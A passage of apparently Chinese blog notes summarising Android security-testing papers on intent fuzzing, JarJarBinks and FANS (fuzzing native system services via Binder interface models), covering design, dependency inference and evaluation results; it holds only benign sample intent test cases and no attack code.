Receiver，当然这个可以排除在目标之外。（静态注册的BroadcastReceiver也是通过intent-filter来声明的）</li><li>Androidmanifest.xml里面的intent-filter除了可能包含的cmp，act，category，data之外，不再包含关于extra data的详细信息，所以之前提到的<em>intent vulnerability</em>的场景很难去触发到，除了把extra全部置空之外，没有把某个字段置为错误类型值的机会，因为连字段名都不知道。这里就需要引入一些static&amp;dynamic的方法去获取intent在目标组件处被解析时，会尝试从中提取哪些字段。（文章没有涉及这个工作，不过我认为可以通过CodeQL或者AST的方法来尝试做一下）</li></ol><h5 id="5-1-2-A-Fuzzing-Strategy-for-Generating-Ground-Intent-Specification"><a href="#5-1-2-A-Fuzzing-Strategy-for-Generating-Ground-Intent-Specification" class="headerlink" title="5.1.2 A Fuzzing Strategy for Generating Ground Intent Specification"></a>5.1.2 A Fuzzing Strategy for Generating Ground Intent Specification</h5><p>顺着上面生成的intent specification，接下来的工作就是生成具体的intent测试用例，也即<em>ground intent specification</em>，然后通过ADB一梭子fuzz。</p><p>作者有这样的观察：为了处理intent，目标组件的代码一般在onCreate()函数一开始时，就通过一系列的条件语句来提取intent的属性值或者extra字段值，然后引入不同的intent响应逻辑中。</p><p>作者认为，<em>intent vulnerability</em>要么因为intent满足了一些条件进入if语句之后触发，要么因为intent没能满足所有条件进入else语句然后触发。可以参考前面的示例代码。（有点儿废话了，我认为这里的一系列的条件语句和intent.getXXX()的函数调用反而告诉了我们组件可以成功响应这一类intent应该具备哪些属性和extra字段）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例：已经提取出来的intent specification</span></span><br><span class="line">&#123; cmp = Activity com.example.android/.Note</span><br><span class="line">act = android.intent.action.EDIT</span><br><span class="line">[ title = String, content = String ] </span><br><span class="line">&#125; || </span><br><span class="line">&#123; cmp = Activity com.example.android/.Note</span><br><span class="line">act = android.intent.action.INSERT </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这种舍本逐末的观察，作者构建了以下三类ground intent specification：</p><ol><li><p>Compatible ground intent specification:<br>兼容性intent，包含intent specification所描述的所有属性且属性值相同，可以额外携带一些其他属性和Extra数据。目的就是进入if语句中。（如果if只检查属性值的话）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; cmp = Activity com.example.android/.Note</span><br><span class="line">act = android.intent.action.EDIT </span><br><span class="line">[ RzUrx7 = boolean True, HR7Ja6d7 = String AHMlyG0z3jjErO ]</span><br><span class="line">dat = URI qoFXwARtpfV-LNN </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Incompatible ground intent specification:<br>非兼容性intent，intent带有正确的属性，但是属性值可以发生变化，同时也可以携带其他属性和Extra数据。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123; cmp = Activity com.example.android/.Note</span><br><span class="line"> act = android.intent.action.ADD </span><br><span class="line"> [ key2 = int[] -1233387, -72316, </span><br><span class="line"> dKQn = String xZQbcCTOW]</span><br><span class="line"> typ = video<span class="comment">/*</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br></pre></td></tr></table></figure></li><li><p>Another Incompatible ground intent specification</p><p>另外一种非兼容性intent，只保留正确的cmp属性，其他属性和Extra数据都随机生成。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; cmp = Activity com.example.android/.Note</span><br><span class="line"> dat = tel:<span class="number">123</span> </span><br><span class="line"> cat = [ ttoIjEWJnpk, vYQEpERvvb, xpWj_Q,</span><br><span class="line"> android.intent.category.APP_CALENDAR] </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li></ol><p>按照作者的设想，compatible intent会进入if语句，也即intent带有正确的属性值(如category，data，action等)，将会测试发现对intent的错误解析逻辑。incompatible intent会进入else语句，这里是响应不正确intent的代码，但是可能并没有设计好逻辑，也许会造成Null等未知的异常。</p><p>这里没有对随机生成的算法进行叙述，我认为这是很重要的，因为我认为随机生成的extra很小概率会是目标组件所认可的。</p><h4 id="5-2-Executing-Intent-Test-Casees-via-ADB-commands"><a href="#5-2-Executing-Intent-Test-Casees-via-ADB-commands" class="headerlink" title="5.2 Executing Intent Test Casees via ADB commands"></a>5.2 Executing Intent Test Casees via ADB commands</h4><p>讲了一下如何基于生成的groud intent specification来构建ADB命令行参数。</p><p>然后ADB测试的流程：</p><ol><li>clear: 清楚上一个测试的app实例</li><li>adb：运行本次测试的adb命令行</li><li>collect：通过logcat收集本次测试的日志</li><li>analyze：分析这次adb命令行测试有没有导致app中的目标组件异常停止，这里是分析log日志里面有没有诸如”xxx has died”之类的字符串模式</li></ol><p>还提了一下频繁测试会导致ADB不稳定，所以设置了一定的等待时间。同时写了一个看门狗程序来检查ADB，情况不对就重启设备。</p><h4 id="5-3-Automatically-Reporting-Failures-Without-Duplication"><a href="#5-3-Automatically-Reporting-Failures-Without-Duplication" class="headerlink" title="5.3 Automatically Reporting Failures Without Duplication"></a>5.3 Automatically Reporting Failures Without Duplication</h4><p>因为同一个问题可能会产生多个log日志，所以提出了一个基于最长公共子序列算法的log去重算法。</p><h3 id="6-Evaluation"><a href="#6-Evaluation" class="headerlink" title="6 Evaluation"></a>6 Evaluation</h3><h4 id="6-1-Failures-Count-Due-to-Intent-Vulnerability"><a href="#6-1-Failures-Count-Due-to-Intent-Vulnerability" class="headerlink" title="6.1 Failures Count Due to Intent Vulnerability"></a>6.1 Failures Count Due to Intent Vulnerability</h4><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301171316.png" alt="image-20220301171316078"></p><p>Failures/appSize 倒是一个不错的衡量app鲁棒性的指标。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301171324.png" alt="image-20220301171324759"></p><h4 id="6-2-Automatic-Classification-of-Failures-in-Android-Logs"><a href="#6-2-Automatic-Classification-of-Failures-in-Android-Logs" class="headerlink" title="6.2 Automatic Classification of Failures in Android Logs"></a>6.2 Automatic Classification of Failures in Android Logs</h4><p>这里的group就是同属于一类的logs，相当于一个单独的vulnerability。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301171910.png" alt="image-20220301171910253"></p><h4 id="6-3-Execution-Time-for-Intent-Fuzz-Testing"><a href="#6-3-Execution-Time-for-Intent-Fuzz-Testing" class="headerlink" title="6.3 Execution Time for Intent Fuzz Testing"></a>6.3 Execution Time for Intent Fuzz Testing</h4><p>单个app的测试时长和针对其生成的intent case数量是成比例的。</p><p>将failure分类的时间一般还是比较小的；Fuzzer tool本身的鲁棒性很强，过程全自动。</p><p>但是设置了单个case 5秒的测试时长，平均一个app的测试时长为3.17h。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301173023.png" alt="image-20220301173023677"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301173104.png" alt="image-20220301173103983"></p><h4 id="6-4-Root-Cause-Analysis-on-Intent-Vulnerability"><a href="#6-4-Root-Cause-Analysis-on-Intent-Vulnerability" class="headerlink" title="6.4 Root Cause Analysis on Intent Vulnerability"></a>6.4 Root Cause Analysis on Intent Vulnerability</h4><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301173450.png" alt="image-20220301173450277"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301173702.png" alt="image-20220301173702068"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301173708.png" alt="image-20220301173707981"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301173717.png" alt="image-20220301173717609"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301173724.png" alt="image-20220301173724004"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220301173730.png" alt="image-20220301173730151"></p><h3 id="7-Discussion"><a href="#7-Discussion" class="headerlink" title="7 Discussion"></a>7 Discussion</h3><p>对比+总结+强调贡献</p><h2 id="2012-JarJarBinks"><a href="#2012-JarJarBinks" class="headerlink" title="2012-JarJarBinks"></a>2012-JarJarBinks</h2><blockquote><p>An Empirical Study of the Robustness of Inter-component Communication in Android</p><p>应该是最早的关于Android Intent Fuzz的论文。（又称ICC Fuzz, Inter-Component Communication Fuzz）<br>详细解释了Android相关的概念。</p></blockquote><h2 id="2020-FANS"><a href="#2020-FANS" class="headerlink" title="2020-FANS"></a>2020-FANS</h2><blockquote><p>FANS: Fuzzing Android Native System Services via Automated Interface Analysis [29th USENIX]</p><p>文章提出了一个全自动化fuzz安卓原生系统服务的工具。<br>依照AOSP编译流程，扫描涉及interface的相关代码源文件，得到所有interface基本信息<br>通过对interface model的理解，生成合法的输入进行测试。<br>测试框架采用CS架构，建立在多台测试真机和服务器之上，发现了若干漏洞和exception。</p></blockquote><h3 id="Knownledge"><a href="#Knownledge" class="headerlink" title="Knownledge"></a>Knownledge</h3><p>Android native system service</p><p>binder &amp; RPC</p><h3 id="challenges"><a href="#challenges" class="headerlink" title="challenges"></a>challenges</h3><ol><li>Android原生系统服务通过基于Binder的特定接口唤醒，所以需要自动识别并生成针对性的测试用例。</li><li>有效的测试用例需要满足对应的接口模型。</li><li>有效的测试用例还得满足语义要求，包括变量依赖和接口依赖</li></ol><h3 id="routine"><a href="#routine" class="headerlink" title="routine"></a>routine</h3><ol><li>首先收集目标服务中所有的interface和nest-interface。</li><li>然后提取interface model以及interface AST，包括transaction code, variable name, variable type in transaction data。</li><li>基于variable name&amp;type推断variable dependency，基于生成和使用关系推断interface dependency。</li><li>基于以上的interface model和dependency知识，生成语义语法合规的sequence of transactions。</li><li>实验在6台Android9机器上进行，从数千个crash中发现了20个vulnerabilities,20个已经被Google确认。以及138个Java exceptions。</li></ol><h3 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h3><h4 id="1-1-Related-Work"><a href="#1-1-Related-Work" class="headerlink" title="1.1 Related Work"></a>1.1 Related Work</h4><h5 id="BinderCracker"><a href="#BinderCracker" class="headerlink" title="BinderCracker"></a>BinderCracker</h5><p>通过记录调用来获取target service model。</p><p>不能获取准确的输入语义知识（变量名和变量类型），也不能获取rare interface和nested interface。</p><h5 id="Chizpufle"><a href="#Chizpufle" class="headerlink" title="Chizpufle"></a>Chizpufle</h5><p>改进BinderCracker: 使用反射技术获取目标interface的参数知识，用于fuzz厂商预置的Java服务。<br>但是不能测试Android原生系统服务。</p><h4 id="1-2-Challenges-amp-Approaches"><a href="#1-2-Challenges-amp-Approaches" class="headerlink" title="1.2 Challenges&amp;Approaches"></a>1.2 Challenges&amp;Approaches</h4><ol><li><p>interface识别：top-level&amp;multi-level【Location】<br>【现状】<br>top-level会在ServiceManager中完成注册，multi-level interface通过top-level interface被获取。<br>多数interface通过AIDL定义，C++定义或者动态生成的interface是少数（之前的研究没有找到统一规律）。<br>【解决】<br>扫描Service注册操作，得到所有的top-level interface<br>扫描<strong>writeStrongBinder</strong>方法得到所有的multi-level interface。(deep interface通过调用该方法动态生成)</p></li><li><p>interface model extraction【Grammar】<br>【现状】<br>对于每个interface，需要找到支持的transactions列表。<br>需要确定interface输入数据的格式，且每个transaction有自己的输入数据格式，需要完全的自动化。<br>【解决】</p><p>考虑到Android总是使用一系列特定的方法来实现序列化和反序列化（readInt32, writeInt32），所以可以通过识别这些方法的调用序列，推断出interface的输入语法。<br>为了维护变量的名字和类型，这里建立了发序列化操作的AST。</p></li><li><p>语义合法的输入生成【Semantic】<br>【现状】<br>Android会有安全检查（Sanity Check），因此输入的data需要语义合法。<br>语义要求包括变量名、变量类型、变量依赖、interface依赖以及变量和interface之间的依赖，比较难提取。<br>【解决】<br>通过2中获取的变量名和类型的知识，识别transaction内的变量依赖。<br>依赖transaction会反序列化被依赖transaction序列化的data，由此可以建立transaction之间的依赖关系。<br>通过生成&amp;使用关系推断interface之间的依赖关系。</p></li></ol><h3 id="2-Background-1"><a href="#2-Background-1" class="headerlink" title="2 Background"></a>2 Background</h3><h4 id="2-1-Android-System-Service"><a href="#2-1-Android-System-Service" class="headerlink" title="2.1 Android System Service"></a>2.1 Android System Service</h4><h5 id="category"><a href="#category" class="headerlink" title="category"></a>category</h5><p>Java System Service[Java: Activity Manager]<br>Native System Service[C++: Camera Service]</p><p>Services in <strong>normal domain</strong>, vendor domain, hardware domain。</p><h5 id="Application-Service-Communication-Model"><a href="#Application-Service-Communication-Model" class="headerlink" title="Application-Service Communication Model"></a>Application-Service Communication Model</h5><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211225151708.png" alt="image-20211225151701175"></p><p>service向service manager注册自己；<br>service监听并响应application的调用，返回调用结果；</p><p>application向service manager请求目标service的interface(top-level interface)；<br>application向top-level interface请求multi-level interface；<br>application调用目标interface的transaction完成动作；</p><h3 id="2-2-Research-Scope"><a href="#2-2-Research-Scope" class="headerlink" title="2.2 Research Scope"></a>2.2 Research Scope</h3><p>Android native system service<br>相关经验可以推广到其他类别的service</p><h3 id="3-Design"><a href="#3-Design" class="headerlink" title="3 Design"></a>3 Design</h3><h4 id="3-1-Design-Choices"><a href="#3-1-Design-Choices" class="headerlink" title="3.1 Design Choices"></a>3.1 Design Choices</h4><h5 id="RPC-centric-testing"><a href="#RPC-centric-testing" class="headerlink" title="RPC-centric testing"></a>RPC-centric testing</h5><p>测试系统服务，可以直接向系统注入服务可响应的事件，直接绕过RPC。<br>但是这种做法会因为生成了大量异常事件带来极高的误报率。</p><p>因为在实际中，攻击者与service的交互会经过IPC机制。<br>而IPC Binder会对数据进行安全检查，序列化操作也会受到系统状态的影响。<br>实现难度较大<br>所以，需要通过将生成数据注入IPC Binder机制，使得达到service的数据满足一定的语法语义特征，从而降低误报率。</p><h5 id="Generation-based-fuzzing"><a href="#Generation-based-fuzzing" class="headerlink" title="Generation-based fuzzing"></a>Generation-based fuzzing</h5><p>mutation-based fuzzing生成的测试数据容易出现语法错误或者语义错误，所以选择Generation-based fuzzing。</p><h5 id="Learn-input-model-from-code"><a href="#Learn-input-model-from-code" class="headerlink" title="Learn input model from code"></a>Learn input model from code</h5><p>如何指导测试用例的生成？<br>grammar knowledge   obtained manully: 大量人工参与，不能自动化<br>learn from transactions recorded：受数据集影响较大，有什么数据学到什么知识；容易忽略不常见的transaction</p><p>从源代码中挖掘输入模型的知识，input model knowledge is buried in the source code</p><h4 id="3-2-Overview"><a href="#3-2-Overview" class="headerlink" title="3.2 Overview"></a>3.2 Overview</h4><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211226164606.png" alt="image-20211226164606597"></p><h4 id="3-3-Interface-Collector"><a href="#3-3-Interface-Collector" class="headerlink" title="3.3 Interface Collector"></a>3.3 Interface Collector</h4><p>每一个interface都会使用onTransact()方法来响应调用操作，可以根据这个知识来识别出所有的interface。<br>具体来说，FANS并不是直接扫描AOSP的所有C/C++源代码，而是扫描出现在编译命令中的所有C/C++源代码，这样子可以识别出通过AIDL动态生成的interface。</p><p><strong>（存疑）</strong><br>目前看来是把AOSP代码编译一遍，然后记录所有的编译命令，搜索编译命令中涉及到的文件，对去检查这些文件是否包含关于接口的代码。<br>这样子就可以检查到编译过程中通过AIDL动态生成的interface。</p><h4 id="3-4-Interface-Model-Extractor"><a href="#3-4-Interface-Model-Extractor" class="headerlink" title="3.4 Interface Model Extractor"></a>3.4 Interface Model Extractor</h4><blockquote><p>对interface建模</p></blockquote><h5 id="3-Principles"><a href="#3-Principles" class="headerlink" title="3 Principles"></a>3 Principles</h5><p>Complete-完备：所有的interface，所有的transaction<br>Precise-准确：要生成合法的输入通过IPC Binder的安全检查。（从变量模式、变量名和变量类型入手，也就是语法与语义都要合法）<br>Convenient-便捷：建模方法要简单。</p><h5 id="Choices"><a href="#Choices" class="headerlink" title="Choices"></a>Choices</h5><p>选择深入分析server端的代码，以期达到更为准确全面的提取效果。<br>先使用工具将AIDL接口代码转化为C/C++代码，保留信息的准确性。<br>再建立AST提取onTransact()方法的信息。</p><h5 id="Transaction-Code-Identification"><a href="#Transaction-Code-Identification" class="headerlink" title="Transaction Code Identification"></a>Transaction Code Identification</h5><blockquote><p>Service-&gt;Interface-&gt;Transaction</p></blockquote><p>一个Service可能有多个Interface，在一个Interface中，根据收到的code的不同，会进入不同的处理逻辑，称transaction。</p><p>具体到onTransact()方法中，interface会根据code将控制流分配到不同的transaction逻辑中。<br>一般会通过switch语句实现，case就是code值了。<br>所以建立了onTransact()的AST模型之后，不同的transaction就会形成不同的子树，由此识别出不同的transaction。</p><h5 id="Variable-Extraction"><a href="#Variable-Extraction" class="headerlink" title="Variable Extraction"></a>Variable Extraction</h5><blockquote><p>通过建立AST，获取interface-transaction<strong>输入输出</strong>的语法语义知识。 Gammar&amp;Semantic</p></blockquote><p>当完成了transaction代码的识别之后，需要进一步地识别出transaction从data中反序列化得到的所有<strong>输入变量</strong>。<br>因为要尝试推断inter-transaction依赖，所以还要识别向replay中序列化注入了哪些<strong>输出变量</strong>。</p><p>flag不需要fuzz，后文用于标记synchronized call和asynchronized call。</p><p>变量通过代码语句生效，从编码的角度而言，有顺序语句、条件语句和循环语句，这里再特别分类出返回语句，那么变量也有相应的4类。</p><p><strong>Sequential Variable</strong>:</p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211226204935.png" alt="image-20211226204935641" style="zoom: 67%;" /><p>checkInterface(): 检查client端提供的token是否合法<br>readXXX(): readInt32, readString16<br>read(a, sizeof(a)*num): 读入一个原生数据结构<br>read(a): 读入一个可子序列化的对象 Flattenable&amp;Light-Flattenable<br>readFromParcel(&amp;data): 基于自己实现的反序列化方法获取对象<br>callLocal():<br>Misc: 调用其他函数处理，递归式识别</p><p><strong>Conditional Variable</strong></p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211226213501.png" alt="image-20211226213501510" style="zoom:67%;" /><p>if&amp;switch语句，将相关的变量(fd)作为conditional input</p><p><strong>Loop Variable</strong></p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211226213513.png" alt="image-20211226213512944" style="zoom:67%;" /><p>识别出循环语句内部的变量，记为loop variable</p><p><strong>Return Variable</strong></p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211226213803.png" alt="image-20211226213803732" style="zoom:67%;" /><p>如果一条执行路径返回了ERROR_CODE，那么这条路径出现漏洞的概率更低。<br>虽然在fuzz的过程中，总是希望输入使得目标程序出现ERROR，但是这里的ERROR是程序本身识别抛出的，说明存在一定的安全检查逻辑。<br>所以会把这条执行路径降权，生成较少的测试用例来测试这条路径。</p><p>同时，会帮助建立准确的transaction间依赖关系。（存疑）</p><blockquote><p>Besides, it will also help us generate explicit inter-transaction dependency, as inputs that do not satisfy the dependency usually fall back to error handling paths.</p></blockquote><h5 id="Type-Definition-Extraction"><a href="#Type-Definition-Extraction" class="headerlink" title="Type Definition Extraction"></a>Type Definition Extraction</h5><blockquote><p>都可以通过AST完成</p></blockquote><p>在基本类型之外，需要重点分析以下三类</p><p>structure-like: 联合体和结构体<br>Enumeration: 枚举类<br>Alias: typedef别名，注意命名空间namespace，避免冲突；可能会递归头文件</p><img src="C:\Users\wenake\AppData\Roaming\Typora\typora-user-images\image-20211226215915343.png" alt="image-20211226215915343" style="zoom:67%;" /><h4 id="3-5-Dependency-Inferer"><a href="#3-5-Dependency-Inferer" class="headerlink" title="3.5 Dependency Inferer"></a>3.5 Dependency Inferer</h4><blockquote><p>interface dependency: how an interface is used by other interface<br>variable dependency in transaction</p></blockquote><h5 id="Interface-Dependency"><a href="#Interface-Dependency" class="headerlink" title="Interface Dependency"></a>Interface Dependency</h5><blockquote><p>onTransact()  write/readStrongBinder() 在interface extrector和interface dependency inferer中的作用不是非常明确。</p><p>用这两种方法标定interface？<br>还是说先用onTransact()标定top-level interface，然后用write/readStrongBinder确定依赖关系，同时标定multi-level interface？</p><p>我认为是后者，因为在interface-colletor.py中还是单纯依赖<code>onTransact()</code>函数名判断是否为interface related file</p><p>【原文】Interface Acquisition： As for top-level interfaces, we can get them through the service manager. Multi-level interfaces can then be recursively obtained via the recognized interface dependency</p></blockquote><h6 id="Generation-Dependency"><a href="#Generation-Dependency" class="headerlink" title="Generation Dependency"></a>Generation Dependency</h6><p>如前所述，top-level interface会直接向servicemanager注册自己，直接被获取。<br>multi-level interface通过top/upper-level interface的返回来获取。</p><p>向A接口请求B接口，则A接口会调用**writeStringBinder()**方法向reply写入一个序列化的B接口，然后返回给调用者。</p><h6 id="Use-Dependency"><a href="#Use-Dependency" class="headerlink" title="Use Dependency"></a>Use Dependency</h6><p>如果B接口使用了A接口，那么B接口会调用readStrongBinder()方法从data中反序列化一个A接口出来用。</p><blockquote><p>区别</p><p>A接口生成B接口，写入reply中给调用者使用。<br>B接口从接收的data中反序列化出来一个A接口使用。</p></blockquote><h5 id="Variable-Dependency"><a href="#Variable-Dependency" class="headerlink" title="Variable Dependency"></a>Variable Dependency</h5><h6 id="intra-transaction"><a href="#intra-transaction" class="headerlink" title="intra-transaction"></a>intra-transaction</h6><p>条件语句-&gt;条件依赖<br>循环语句-&gt;循环依赖<br>array类数据-&gt;array依赖，通常会有一个变量来声明array的长度，类似循环依赖</p><h6 id="inter-transaction"><a href="#inter-transaction" class="headerlink" title="inter-transaction"></a>inter-transaction</h6><p>一个transaction的input可能是另外一transaction的output。（两个transaction同属一个interface）</p><p>这里采取的是一些模糊的规则来建立跨transaction的<strong>两个变量</strong>之间的依赖（依据存疑）</p><ol><li>一个变量是输入，一个变量是输出</li><li>处于不同的transaction</li><li>变量的类型相同 (primitive type)</li><li>要么输入变量的type不是基本类型，要么两者的变量名相似</li></ol><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211226230410.png" alt="image-20211226230410400" style="zoom:67%;" /><h4 id="3-6-Fuzzer-Engine"><a href="#3-6-Fuzzer-Engine" class="headerlink" title="3.6 Fuzzer Engine"></a>3.6 Fuzzer Engine</h4><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211227094740.png" alt="image-20211227094739944" style="zoom: 67%;" /><p>Fuzz工作在设备上进行<br>Manager将fuzzer和语料传递到设备上<br>fuzzer将日志数据传回用于分析</p><h5 id="Principles-of-Transaction-Generator"><a href="#Principles-of-Transaction-Generator" class="headerlink" title="Principles of Transaction Generator"></a>Principles of Transaction Generator</h5><p>在生成transaction数据时，依次满足以下三个principle</p><ol><li><p>约束：A变量是否存在取决于B变量，则在生成transaction时，先检查B变量</p></li><li><p>依赖：如果A变量可以通过一个transaction生成，则以较高的概率通过这个transaction生成一个A变量，以较低的概率不通过transaction生成</p></li><li><p>类型与名称：直接根据变量的类型和名称生成具体的值，例如根据<em>opPackageName</em>生成一个<em>String16</em>，根据<em>pid</em>生成一个<em>int</em>。</p><blockquote><p>依赖原则是调用其他transaction生成数据，类型与名称原则是直接生成，相互矛盾。<br>如果有个变量A既可以通过transaction生成，也有type和name，如何处理？<br>依照原则的优先级，应该以较高概率使用依赖原则调用其他transaction生成数据，以较低概率直接直接生成。</p></blockquote></li></ol><h3 id="4-Implementation-1"><a href="#4-Implementation-1" class="headerlink" title="4 Implementation"></a>4 Implementation</h3><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211227100633.png" alt="image-20211227100633367" style="zoom:67%;" /><p>从零开始的FANS，而不是AFL-based。</p><h5 id="搜索接口-Interface-Collector"><a href="#搜索接口-Interface-Collector" class="headerlink" title="搜索接口 Interface Collector"></a>搜索接口 Interface Collector</h5><p>因为有的interface是通过AIDL动态生成的，所以这里是在编译AOSP源码的过程中记录编译命令，获取到interface和variable。<br>具体的原理尚不清楚，但是根据前文“并不是扫描整个AOSP源码”描述，猜测可能是通过编译命令涉及到的文件缩小搜索范围，根据onTransaction获取interface相关代码文件，然后提取interface model。</p><h5 id="提取接口-Interface-Model-Extractor"><a href="#提取接口-Interface-Model-Extractor" class="headerlink" title="提取接口 Interface Model Extractor"></a>提取接口 Interface Model Extractor</h5><p>使用Clang生成AST文件，只保留AST中与输入输出变量相关的节点，接着进行后续处理使其可以被fuzzer使用。(JSON格式)</p><h5 id="依赖推断-Dependency-Inferer"><a href="#依赖推断-Dependency-Inferer" class="headerlink" title="依赖推断 Dependency Inferer"></a>依赖推断 Dependency Inferer</h5><p>遍历AST，推断出interface的<strong>generation dependency</strong>和<strong>use dependency</strong>，<br>以及variable的<strong>inter-transaction dependency</strong>。</p><h5 id="Fuzzer-Engine"><a href="#Fuzzer-Engine" class="headerlink" title="Fuzzer Engine"></a>Fuzzer Engine</h5><p>在host上的Fuzzer Manager会在多台设备上运行fuzzer、同步数据。</p><p>使用ASan检查内存错误</p><p>fuzzer以root权限运行</p><p>配置flag，表示是否需要接收reply，指定transaction是synchronous还是asynchronous</p><p>logcat+tombstones记录crash</p><h3 id="5-Evaluation-1"><a href="#5-Evaluation-1" class="headerlink" title="5 Evaluation"></a>5 Evaluation</h3><h4 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a>Interface</h4><h5 id="Interface-Collection"><a href="#Interface-Collection" class="headerlink" title="Interface Collection"></a>Interface Collection</h5><p>编译1小时，搜索几秒钟，共计68个interface。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211227142202.png" alt="image-20211227142202600"></p><h5 id="Interface-Dependency-1"><a href="#Interface-Dependency-1" class="headerlink" title="Interface Dependency"></a>Interface Dependency</h5><p>依赖关系图大致是有向无环图。<br>一个interface可以通过多个上级interface得到，<strong>于是从多条依赖路径来测试目标interface</strong>。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211227143640.png" alt="image-20211227143640748"></p><h4 id="Interface-Model-1375"><a href="#Interface-Model-1375" class="headerlink" title="Interface Model 1375"></a>Interface Model 1375</h4><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211228161948.png" alt="image-20211228161948206"></p><p>811个interface transactions，1375条transaction path，说明许多transaction有多条执行路径、多个返回可能。</p><h5 id="statistices"><a href="#statistices" class="headerlink" title="statistices"></a>statistices</h5><p>多数变量是conditional variable</p><p>所有的别名操作（typedef）都是对三种基本变量的重组，内涵更多的语义信息。</p><p>Primitive、String之间的依赖较多</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211227151522.png" alt="image-20211227151521965"></p><img src="C:\Users\wenake\AppData\Roaming\Typora\typora-user-images\image-20211226215915343.png" alt="image-20211226215915343" style="zoom:67%;" /><h5 id="建模方法的准确性"><a href="#建模方法的准确性" class="headerlink" title="建模方法的准确性"></a>建模方法的准确性</h5><p>因为没有可以对比的数据和研究，所以这里是随机选择了10个interface手动建模对比的。</p><blockquote><p>not entirely precise but good enough</p></blockquote><h5 id="漏洞列表"><a href="#漏洞列表" class="headerlink" title="漏洞列表"></a>漏洞列表</h5><p>共计30个漏洞，22个在Android native system service中， 5个在lib中，3个属于Linux的漏洞。</p><p>还触发了138个Java Exception</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211227160557.png" alt="image-20211227160557260"></p><h3 id="6-Discussion"><a href="#6-Discussion" class="headerlink" title="6 Discussion"></a>6 Discussion</h3><h4 id="对比评价"><a href="#对比评价" class="headerlink" title="对比评价"></a>对比评价</h4><h5 id="BinderCracker-1"><a href="#BinderCracker-1" class="headerlink" title="BinderCracker"></a>BinderCracker</h5><p>开源 vs 闭源</p><p>基于input model vs 基于traffic学习</p><p>30+138 on 9.0 vs 89 on 5.1 </p><p>automated vs manully [gong(first)]</p><p>native and promote vs vendor [Chizpurfle]</p><h4 id="自我评价"><a href="#自我评价" class="headerlink" title="自我评价"></a>自我评价</h4><h5 id="Interface-Model-Accuracy"><a href="#Interface-Model-Accuracy" class="headerlink" title="Interface Model Accuracy"></a>Interface Model Accuracy</h5><blockquote><p>good enough but not entirely precise</p></blockquote><p>loop次数的判定：如果不能准确确定，就使用loop的前一个变量。<br>用alias标识变量类型，但是使用时又用primitive type。<br>transaction dependency: 可能存在特定的调用顺序，服务可以被视作状态机 （？state-sensitive）</p><h5 id="Coverage-Guided-Fuzzing"><a href="#Coverage-Guided-Fuzzing" class="headerlink" title="Coverage Guided Fuzzing"></a>Coverage Guided Fuzzing</h5><p>没有使用覆盖率知识<br>state-sensitive: 当前程序的coverage也还受到之前输入的影响。（Fork()）</p><h5 id="Fuzzing-Efficiency"><a href="#Fuzzing-Efficiency" class="headerlink" title="Fuzzing Efficiency"></a>Fuzzing Efficiency</h5><p>fuzzer以root权限运行，导致系统经常进入recovery模式。<br>然后就得手动重新刷机，影响实验效率。</p><h5 id="Interface-based-Fuzzing-in-Android"><a href="#Interface-based-Fuzzing-in-Android" class="headerlink" title="Interface-based Fuzzing in Android"></a>Interface-based Fuzzing in Android</h5><p>提出可以把本文的理论推广到vendor service和hardware service。</p><h3 id="7-My-View"><a href="#7-My-View" class="headerlink" title="7 My View"></a>7 My View</h3><p>测试部署架构，不够稳定，性能不够  -&gt; 模拟器</p><h2 id="FANS-Code-Review"><a href="#FANS-Code-Review" class="headerlink" title="FANS Code Review"></a>FANS Code Review</h2><p>android.googlesource.com访问有问题，使用aosp.tuna.tshinghua.edu.cn替换来git 